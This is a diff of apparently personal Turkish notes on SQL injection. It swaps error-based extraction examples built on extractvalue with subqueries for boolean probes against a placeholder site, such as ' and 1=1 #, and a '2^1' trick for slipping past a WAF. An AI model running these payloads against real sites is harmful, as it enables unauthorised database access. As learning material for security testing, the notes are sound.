@@ -106,11 +106,12 @@ SELECT extractvalue(rand(), concat(1,(SELECT database())));
 
 ## AND/OR SQLi
 ```SQL
-SELECT extractvalue(rand(), concat(1,"Ali"));
-		burada sonuç olarak hata dönüyor ama içinde "Ali" de geçiyor. Sorgunun içindeki string değeri hatanının içinde döndürtmeyi başardın demek.
-		böylece subquery kullanabilirsin demek oluyor.
-SELECT extractvalue(rand(), concat(1,(SELECT 'mehmet')));  eğer yine hatada mehmet dönerse istediğin sorguyu atabilirsin.
-SELECT extractvalue(rand(), concat(1,(SELECT database())));
+	www.x.com/?id=1' and '2'=1
+yaptığında sayfanın davranışına göre kod analizi yapabilirsin.
+	www.x.com/?id=1' and 1=1 #  bu da iş yapar
+WAF kafana geçiriyorsa
+	www.x.com/?id=2^1 
+koy site değişiyorsa SQLi vardır demektir.
 ```
 
 ## WHERE id IN (1)
